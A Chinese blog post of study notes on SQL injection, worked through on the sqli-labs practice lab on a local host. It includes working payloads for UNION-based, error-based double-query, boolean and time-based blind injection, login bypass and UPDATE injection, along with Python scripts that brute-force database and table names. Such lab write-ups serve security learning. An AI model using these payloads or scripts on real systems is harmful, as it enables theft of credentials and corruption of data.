---
layout: post
title: sql注入
tag: codes
---

<h2>sql注入</h2>

好不容易找到一点方法，开始入门了，从sql注入开始学习。

在github上有一个开源的sql注入学习框架，[sqli-labs](https://github.com/Audi-1/sqli-labs)，利用的是PHP+Mysql。
clone框架到了woobuntu上，并且配置好环境(apache2+php+mysql)。
正好可以学习一点php和mysql的知识。

<h2>About</h2>

学习的过程中来总结sql注入中所用的语句(mysql环境)。
sql注入可以按照不同的方法进行分类。

可以按照注入点类型分类，按照提交数据的方式进行分类，也可以按照执行效果来分类。

<h3>按照注入点类型来分类</h3>

<h4>数字型注入点</h4>

在 Web 端大概是 http://xxx.com/news.php?id=1 这种形式，其注入点 id 类型为数字，所以
叫数字型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where id=1。

<h4>字符型注入点</h4>

在 Web 端大概是 http://xxx.com/news.php?name=admin 这种形式，其注入点 name 类型为
字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where name='admin'。
注意多了引号。

<h4>搜索型注入点</h4>

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，
有的不显示在的链接地址里面，而是直接通过搜索框表单提交。
此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%'。

<h3>按照数据提交的方式来分类</h3>

这种分类其实只是 HTTP 传递数据的方式不同，严格来讲和 SQL 没多大关系。

<h4>GET 注入</h4>

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接
http://xxx.com/news.php?id=1 , id 是注入点。

<h4>POST 注入</h4>

使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。

<h4>Cookie 注入</h4>

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

<h4>HTTP 头部注入</h4>

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，
Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

<h3>按照执行效果来分类</h3>

<h4>基于报错注入</h4>

这一类的也叫有回显注入，页面会返回错误信息，或者是把注入语句的结果直接返回在页面中。

<h4>基于布尔的盲注</h4>

根据返回页面的结果判断构造的 SQL 条件语句的真假性

<h4>基于时间的盲注</h4>

当根据页面返回的内容不能判断出任何信息时，使用条件语句查看时间延迟语句是否执行，
也就是看页面返回时间是否增长来判断是否执行。

<h2>注入语句</h2>

<h3>常用mysql函数</h3>

<code>version()</code>

<code>current_user()</code>

<code>select * from information_schema.tables/columns</code>

<h3>Part 1</h3>

<code>1.union select 1,2,3...</code>

<code>2.order by x</code>

这两个语句主要是在成功提交数据后，猜解column数，并能够找到合适的地方显示我们注入后返回的数据。

配合在mysql version>5.0，在mysql存在information_schema.tables，和columns，能够显示所有
的表名和列名。

如：当判断当前的列数之后，假设为3

<code>union select 1,2,table_name from information_schema.tables</code>

<code>union select 1,2,column_name from information_schema.columns</code>

table_name和column_name存在的位置和最后在页面返回的结果相关。若最后结果只显示返回列中的后两列，
那么相应的，table_name和column_name也必须在最后两列。


<h4>Example</h4>

<h5>GET - Error based - Single quotes - String</h5>

进入网页，提示input the id as parameter。

那么就在url后面加上?id=1。

结果返回：

<img src="/images/sql_1.png">

这是正常提交数据的结果，而题目说Single quotes，那么我们在后面加上一个" ' "单引号。

提交数据：?id=1'

结果返回：

<img src="/images/sql_2.png">

报错。

<code> ''1'' LIMIT 0,1'	</code>
根据报错来看，是多加了一个引号导致语句提前闭合。第一个和最后一个引号为报错时自动提供的，第二个和
第四个引号为php处理加上的，第三个引号为提交上去的。

可以根据php代码来看，构成sql语句的代码为

<code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code>

在提交数据后，完整的语句应该是

<code>SELECT * FROM users WHERE id='1'' LIMIT 0,1</code>。

想要正确的执行这条语句，那么必须去掉后面多余的语句。既然没有做任何的过滤，那么就能够提交'#'或者'--'，
这两个符号在mysql中，都是表示注释到行尾。但在url中，不能直接提交'#'符号，需要经过urlencode，
也就是提交'%23'。'--'在mysql中的限制就是至少在这个符号前面或后面得有空格。

那现在可以提交数据：?id=1'%23 

结果返回：

<img src="/images/sql_1.png">

<h5>利用</h5>

这样，我们就可以绕过sql语句的限制，插入我们想要的语句。
比如：?id=1'%23 union select 1,2,3
先找出表字段有几个。之后再用：?id=1' union select 1,2,table_name from information_schema.tables%23，
以及：?id=1' union select 1,2,column_name from information_schema.columns%23，
理论上这样表名和列名都能获取了。不过在这个例子中，php代码里面有做限制，只能读取mysql语句
执行后返回结果的第一条记录，我们可以这样做修改：

{% highlight php %}

while($row = mysql_fetch_array($result)){

	echo "<font size='5' color= '#99FF00'>";
	echo 'Your Login name:'. $row['username'];
	echo "<br>";
	echo 'Your Password:' .$row['password'];
	echo "<br>";
	echo "</font>";
}

	if(!$row)
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>"; 
	}

{% endhighlight %}

由于$row = mysql_fetch_array($result)只取出返回结果的一条记录，所以用循环来控制将所有的结果返回。

根据表名和列名构造最后的语句:?id=1' union select 1,username,password from users%23

<img src="/images/sql_3.png">

Less_1 ～ Less_4都是相同的情况，只需要通过fuzz猜出最后执行的sql语句，然后构造执行自己提交的数据
就成功了。

<code>update 2016/4/27 </code>

上面的利用还是有问题,不能说最后只返回了第一条记录，就不能获取其他信息。

下面说说最近学到的一些方法。

还是和上面一样，先确定最后执行的语句。

先构造完整的语句: ?id=' --+
这样产生的sql语句返回的内容是空的，所以也没上不会有任何显示。

所以接下来就可以用union select 或者其他语句注入出其他信息，并且能在页面上显示。

构造语句:id=' union select 1,table_name,database() from information_schema.tables 
where table_schema=database() limit 0,1--+

这样就把数据库的名字，以及第一张表的名字给回显出来了。

<img src="/images/sql_14.png">

<h3>Part 2</h3>

<h4>Double query injection</h4>

翻译过来就是二次查询注入，这种注入也是error based类型。利用mysql或者其他类型数据库的报错，在报错中显示
我们需要的数据。

在这种类型的注入中主要利用到几个sql语句：

<code>select concat() 拼接字符串的函数 </code>

<code>select conut(*) 计数的函数</code>

<code>rand() 产生随机浮点数数0~1</code>

<code>floor() 取整</code>

<code>group by 按照某个变量分组</code>

<h6>注入语句：</h6>   

<code>and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))a from 
information_schema.tables group by a)x)%23</code>

关于这个错误的原理，我还是没有了解清楚。不过大致上是：group by 的值不能为rand()产生的数。

[解释一](https://segmentfault.com/q/1010000000609508)

[解释二](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)

<code>update 2016/4/12 </code>

[解释三](http://drops.wooyun.org/tips/14312)

还是大神解释的对。在临时表中插入时产生了重复，二次计算两次的值不一样。所以产生了报错。

多逛wooyun的drops。

<h4>Example</h4>

<h5>Double Injection - Single Quotes </h5>

这种类型的注入，可以利用再页面会显示sql语句错误提示的页面中。

上一个例子也适用。

先测试一下：

?id=1' and (select 1 from (select count(*),
concat((select version()),floor(rand(0)*2))a
from information_schema.tables group by a)x)%23

<img src="/images/sql_4.png">


开始爆表：

?id=1%27%20and%20%28select%201%20from%20%28select%20count%28*%29,
concat%28%28select%20table_name%20from%20information_schema.tables%20limit%20139,1%29,
floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a%29x%29%23

<img src="/images/sql_5.png">

接下来就是爆列和字段。可以利用count(*)计算表数量和列数量，尽量limit猜靠后面的非系统默认的表和列。

?id=1' and (select 1 from (select count(*),concat((select column_name
from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
information_schema.tables group by a)x)%23


<img src="/images/sql_6.png">

<img src="/images/sql_7.png">

因为只能返回一列的数据，所以用limit来限制返回的数据，就只能一个一个数字来试。

?id=1' and (select 1 from (select count(*),
concat((select concat(username,':',password) from users limit 1,1),
floor(rand(0)*2))a from information_schema.tables group by a)x)%23

<img src="/images/sql_8.png">

<code> update 2016/4/27 </code>
这种类型的注入是因为在报错中可以返回字段内容。也可以利用盲注来进行。

不过盲注的速度就没有这样快。

为什么在这个例子中可以用盲注:

<img src="/images/sql_15.png">

当在sql语句的最后加上了一个bool值进行判断时，若为假，则最后的结果就是空的。
最后结果为空，页面上就什么也不会回显。那么与正常情况下存在区别，就可以利用盲注来进行猜内容。

分析一下php源代码:

<img src="/images/sql_16.png">

在代码中，很明显是根据查询结果row是否为空来选择是echo You are in还是输出error。结合上面的，如果and后面的内容为false，那么最后的查询结果就是一个empty set，那么row的内容就为空，也就进了else准备输出error，可是error里面并没有任何错误可以输出，所以最后仔细观察在页面上只输出了一个br。

<code>update 2016/4/26 </code>

<h3>Part 3</h3>

<h4> Blind -Bool based</h4>

这种类型的注入是基于bool，也就是根据正常页面来判断当前注入的语句是否成功执行。
存在的情况有点像是在一个页面，你可以使用sql语句，但是你不能看到sql语句后的结果，
那么就只有盲注来猜测返回的是什么内容。

例如: http://192.168.1.104/sqli-labs/Less-8/?id=1  这样就是正常情况下。
如果加上:http://192.168.1.104/sqli-labs/Less-8/?id=1' and 0 --+ 
1为true，0则为false。产生的结果就不一样。

利用到的语句:

<code>select database()</code>

<code>select length(databse())</code>

<code>select substr(database(),1,1)</code>

<h4>Example</h4>

在sqli的less8中，就是一种bool based injection。

首先，盲注猜测出当前的数据库名。
利用 select database()可以返回当前数据库的名字。那么怎么和bool联系上？
因为我们用到的是盲注，是不知道database的名字的，也就是说不知道名字的长度。
于是 select length(databse()) 返回当前数据库名字的长度。
返回长度那又怎么让自己知道呢。
加上一个判断值，就能构成一个bool值了。

例如: http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select length(database()))=8 --+ 

很明显，数据库的名字长度是8，所以我当然猜是8。

在完全不知情的情况下，还可以用二分法来判断，进行大于小于的比较，产生一个bool值。

逐步缩小范围，最后确定数据库名字的长度。

到这里，才知道了数据库名字的长度，那么怎么继续通过盲注获得具体名字呢。

有一个函数 substr(str,1,1)  substr是字串函数，str是原字符串。

第二个变量是字串在str中的起始位置，第二个是字串的长度。

例如:http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select substr(databse(),1,1))='s' --+

<img src="/images/sql_9.png">

因为在sqli里面，数据库的名字叫security。

如果在不知情的情况下，去猜测的话，那么就是a-z,A-Z，0-9 以及 _

这样手工盲注的话，得累死。 

python写一个小脚本。

{% highlight python %}

# -*- coding: utf-8 -*-
import requests

result = ""	

url="http://192.168.1.106/sqli-labs/Less-8/?id=1'and (select substr(database(),%d,1))='%s'--+"

for x in range(1,9):
	flag=True
	for i in range(ord('a'),ord('z')+1):
		if(flag == False):
			break
		test_url = url % (x,chr(i))
		r = requests.get(test_url)
		if "You are in" in r.content:
			result = result + chr(i)
			flag = False
	for i in range(ord('A'),ord('Z')+1):
		if(flag == False):
			break
		test_url = url % (x,chr(i))
		r = requests.get(test_url)
		if "You are in" in r.content:
			result = result + chr(i)
			flag = False
	print result

{% endhighlight %}

结果:

<img src="/images/sql_10.png">

能猜出数据库的名字，那么就可以利用information_schema.tables
获取当前数据库的表，获取字段。
接下来就可以盲注出数据库中的内容。

例如：http://192.168.1.104/sqli-labs/Less-8/?id=1%27%20and%20
(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)=6%20--+

可以先用count(*)判断有多少表，然后盲注猜表名长度，最后表的名字。

用python盲注表的名字。

{% highlight python %}

# -*- coding: utf-8 -*-
import requests

result = ""	

url="http://192.168.1.104/sqli-labs/Less-8/?id=1' and (select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))='%s' --+"


for x in range(1,7):
	flag=True
	for i in range(ord('a'),ord('z')+1):
		if(flag == False):
			break
		test_url = url % (x,chr(i))
		r = requests.get(test_url)
		if "You are in" in r.content:
			result = result + chr(i)
			flag = False
	for i in range(ord('A'),ord('Z')+1):
		if(flag == False):
			break
		test_url = url % (x,chr(i))
		r = requests.get(test_url)
		if "You are in" in r.content:
			result = result + chr(i)
			flag = False
	print result

{% endhighlight%}

<img src="/images/sql_11.png">

这个是在获取表名字的长度下进行盲注猜测。

如果完整的做好的话。估计就是sqlmap了。

有空做个完整的试试。

<code>update 2016/4/27 </code>

自动化blind injection 猜测出当前数据库所有的表名。
{% highlight python %}
# -*- coding: utf-8 -*-
import requests


url1 = "http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=%d --+"  

count = 0

for x in range(1,100): // 判断当前数据库有多少表
	test_url = url1 % (x)
	r = requests.get(test_url)
	if "You are in" in r.content:
		count = x
		break

print count,"tables"

for c in range(0,count):
	url="http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s' --+"
	
	url2="http://192.168.1.106/sqli-labs/Less-8/?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d --+"

	length =0
	for l in range(1,100): //判断表名的长度
		test_url=url2 % (c,l)
		r = requests.get(test_url)
		
		if "You are in" in r.content:
			length = l		
			break	

	print "the table name length:",length

	result = ""
	for x in range(1,length+1): //盲注表名的内容
		flag=True
		for i in range(ord('a'),ord('z')+1):
			if(flag == False):
				break
			test_url = url % (c,x,chr(i))
			r = requests.get(test_url)
			if "You are in" in r.content:
				result = result + chr(i)
				flag = False
		for i in range(ord('A'),ord('Z')+1):
			if(flag == False):
				break
			test_url = url % (c,x,chr(i))
			r = requests.get(test_url)
			if "You are in" in r.content:
				result = result + chr(i)
				flag = False
	print result
{% endhighlight%}

<img src="/images/sql_12.png">

<h4>Time based blind injection</h4>

上面学完了基于bool的盲注，还有一种盲注基于时间的盲注。

这种盲注主要出现在，在注入时页面没有返回或者不管true还是false看到的页面结果都是一样的。

那么就可以利用时间来判断是否成功执行了语句。

主要用到两个内置函数:

<code>sleep()</code>

<code>if(expr1,expr2,expr3)</code>

用法：

sleep(5) 就表示等待5s。

if()中的三个参数，若expr1为true，那么就执行expr2，否则就执行expr3。

<h4>Example</h4>

<h4>Less-9 Blind time-based</h4>

在less-9中，提供的就是time-based类的盲注。

例如:http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%201 --+

和:http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%200 --+

返回的结果都一样。

利用前面讲的两个函数：

构造一下:

http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%20if((select%20database())=%27security%27,sleep(3),null)--+

解释一下:在and后面接一个bool值，里面的内容是如果database()=security，那么则会执行sleep(3)
否则就执行null。很明显，如果我们盲注正确的话，就会sleep 3s。

配合bool盲注里面的substr和length，一个一个的猜字符。

例如:猜数据库的表数

http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=4,sleep(3),null) --+

数据库的表个数为4，那么页面就会在载入状态等待3s。

python的脚本：

{% highlight python %}
# -*- coding: utf-8 -*-
import requests
import time

url1 = "http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(1),null) --+"

count = 0

for x in range(1,100):
	test_url = url1 % (x)
	start = time.time()
	r = requests.get(test_url)
	end = time.time()
	if (end-start) > 0.9:
		count = x
		break

print count,"tables"

for c in range(0,count):
	url="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s',sleep(1),null) --+"
	
	url2="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d,sleep(1),null) --+"

	length =0
	for l in range(1,100):
		test_url=url2 % (c,l)
		start = time.time()
		r = requests.get(test_url)
		end = time.time()
		if (end-start) > 0.9:
			length = l		
			break	

	print "the table name length:",length

	result = ""
	for x in range(1,length+1):
		flag=True
		for i in range(ord('a'),ord('z')+1):
			if(flag == False):
				break
			test_url = url % (c,x,chr(i))
			start = time.time()
			r = requests.get(test_url)
			end = time.time()
			if (end-start) > 0.9:
				result = result + chr(i)
				flag = False
		for i in range(ord('A'),ord('Z')+1):
			if(flag == False):
				break
			test_url = url % (c,x,chr(i))
			start = time.time()
			r = requests.get(test_url)
			end = time.time()
			if (end-start) > 0.9:
				result = result + chr(i)
				flag = False
	print result
{% endhighlight%}

这种方式，在网络状态不好的情况下就不太方便了。

而且sleep的时间需要设置较长。注入所需的时间也就需要较长。

结果和上面bool盲注的一样。

<img src="/images/sql_13.png" alt="">

<code>update 2016/5/11</code>
<h4>SQLi in GET/POST/COOKIES</h4>

上面已经差不多所有注入的方法都提到了。

下面就是关于注入点的问题。

注入无非就是非法的数据输入，后台接收后错误的执行。导致数据泄露。

关于数据输入的方式，也有GET和POST，甚至在COOKIES里面。

之前提到的注入都是在GET方法里面的，下面来看看在POST和COOKIES里面的注入。

<h4>Example</h4>

<h5>Less 11-12</h5>

在这两个例子里面，都是一种基于error based的注入。

其实这种注入无非是根据mysql执行报错，来构造最后执行的语句。

在Less11中，在username和password里面填入

‘ or '1'='1 ,这样可以直接绕过登录。也可以只在一个字段里面填写 ‘ or 1=1 #

分析一下最后执行的sql语句：

第一种： 

SELECT username, password FROM users WHERE username='' or '1'='1' 

and password='' or '1'='1' LIMIT 0,1

按照执行的逻辑来看，首先username=’‘为false，‘1’=‘1’为true，

所以（username=‘’ or '1'='1'）就为true，后面也就同理，加上password的false，

最后又是和or里面true，所以最后的结果就为true。

这里可以用一种简便的方法，也是这种登陆框最常用的绕过方法。在用户名字段任意填写，

在密码字段填写 ‘ or '1'=1 ，在where语句，最后执行的语句必然是

（****） or '1'='1' ，这样的bool值必然为true。

第二种：

SELECT username, password FROM users WHERE username='' 

or 1=1 #' and password='' LIMIT 0,1

这样的语句就更好的理解了，前面 username=’‘ or 1=1的值为true，

#后面的内容被注释不会执行。

这里有一个注释的问题就是，不能够使用--+注释

需要用 ’ or 1=1 --  

注意在--的前后都需要留空格,

这可能是在post方法传输数据的时候存在的问题。

<code>update 2016/08/12</code>

今天收到一封邮件，是关于这个问题的正确解释。

可以参考：[Stackoverflow](http://stackoverflow.com/questions/38817326/in-this-case-why-the-comment-style-of-mysql-can-work/38880103#38880103)

才知道，'--+'在mysql中并不是注释。

涨姿势了～

<img src="/images/sql_17.png" alt="">


还是同样的问题，这种注入该怎么利用？

按照我的理解，应该还是可以利用union联合查询来爆数据。

<img src="/images/sql_18.png" alt="">

<h5>Less 13-14</h5>

Double query injection

原理上面已经讲过了，在学习post方法的这种注入过程里。

又有一点别的理解。

先来看看Less5中的案例：

?id=0 and (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x)

如果我们把数据字段写成一个不存在的数据，并且用and链接，

那么最后的结果是空，什么都不会显示。

这和where中的bool值有关。

那么在Less13-14中，登陆框要求输入的是username，

字段留空的话最后的结果也会是空。

那么我们构造语句的话，用and连接并不合适。

那么可以利用or来连接。

' or (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x)

<img src="/images/sql_19.png" alt="">

<h4>bool based injeciton in POST</h4>

同样在Post方法里面，还有基于盲注的，例如Less15 -16。

在username字段里面提交：' or (select length(database()))=8 #

显示结果是：

<img src="/images/sql_22.png" alt="">

试试bool为false：' or (select length(database()))=7 #

<img src="/images/sql_23.png" alt="">

<h4>SQLi in Update query</h4>

在数据库的操作中，最常用的是查询语句，但偶尔还是会用上Update语句的。

同样在Update语句中依然存在注入。

在Less17中，就是一个Update的例子。

先看看sql的update语句。

update table_name set Column1='' where Column2='xx';

上面的更新语句是指在table_name中

更新column2字段为xx的对应记录中的Column1中的值。

在这个less中，对应的update语句为：

例如将admin的密码设为123

update users set Password='123' where username='admin';

那么这就修改了Password字段。

在输入时，我们就可以输入注入数据。

在username填入admin,password字段填入 ‘ # 这样最后的语句会为：

update users set Password='' # where username='admin'

这样就会把整个users表中的Password的字段内容修改为空。

<img src="/images/sql_20.png" alt="">

那这样的注入功能会不会很鸡肋。

在这种情况下，貌似还只能利用double query injection

去进行注入。原因是:

如果你构造成bool based blind injeciton：

UPDATE users SET password = '' or (select length(database()))=8 #' WHERE username='admin'

也就是提交 admin ，’ or (select length(database()))=8 #,这样的话，mysql的逻辑会去判断password后面的两个内容相当于是(expr1) and (expr2),其中的expr1为‘’，expr2为(select length(database()))=8，这种情况下，expr1为false，expr2为true，or之后为true。

这里的连接词还不能用and，可能是这个mysql版本有关，当前的环境是5.2.68环境。我猜测可能是在判断bool的时候，如果前面的值为false并且用and链接的话，mysql就不会继续去解析后面的语句。

这样mysql就会被理解成password=1。后面加上#当作注释，也就是把users整张表的password字段内容设为了1。

在最后的显示页面成功与否并会产生任何差异，所以这种注入没有任何用。

所以就只能利用double query injection，让mysql通过报错来回显数据。

构造的注入如下：

UPDATE users SET password = '' or (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'

所以如果写成这样：

UPDATE users SET password = '1' or (select 1 from (select count(\*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)x) #' WHERE username='admin'

那么这个语句就能正常的显示：

<img src="/images/sql_21.png" alt="">

当然，杜绝这种注入的方法也很简单。把mysql的报错不返回给用户页面就可以了。

<h4>SQLi in Header</h4>

这种注入就是在提交数据的时候，后台处理了header里面的内容，那么我们就可以利用截包软件，修改数据，再发到后台进行修改。

在header里面，有agent和reference可以用来利用。

<h4>SQLi in Cookies</h4>

同样，知识注入点在哪里的不同，注入方式上面都有讲到。

<h4>Example</h4>

Less-20

在这个例子里面，cookie有一个name参数。

在firefox中利用tamper data截取数据进行修改。

<img src="/images/sql_24.png" alt="">

<img src="/images/sql_25.png" alt="">

EOF